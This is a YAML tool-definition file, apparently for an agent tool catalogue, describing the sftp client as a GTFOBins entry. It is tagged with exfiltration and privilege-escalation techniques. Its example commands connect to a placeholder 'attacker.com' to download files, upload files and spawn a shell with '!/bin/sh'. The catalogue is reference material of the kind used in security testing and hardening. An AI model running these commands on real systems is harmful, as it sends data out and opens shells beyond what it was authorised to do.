---
id: network-ssh-sftp
namespace: network:ssh:sftp
name: sftp
description: SSH File Transfer Protocol client; can transfer files and spawn shells
  Can also download files, spawn an interactive shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- sftp
parameters: []
features:
- file-system
- interactive
- local
- network-intensive
- process-manip
- remote
- requires-root
execution:
  template: sftp
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: 'sftp user@attacker.com

    get /path/to/input-file /path/to/output-file'
- description: Spawn an interactive shell
  command: 'sftp user@attacker.com

    !/bin/sh'
- description: Upload files
  command: 'sftp user@attacker.com

    put /path/to/input-file /path/to/output-file'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/sftp/
techniques:
- collection
- privilege-escalation
- execution
- exfiltration
install:
- method: apt
  package_name: openssh-client
  commands:
  - apt-get install -y openssh-client
---

# sftp

sftp is a command-line utility. SSH File Transfer Protocol client; can transfer files and spawn shells Can also download files, spawn an interactive shell, upload files.
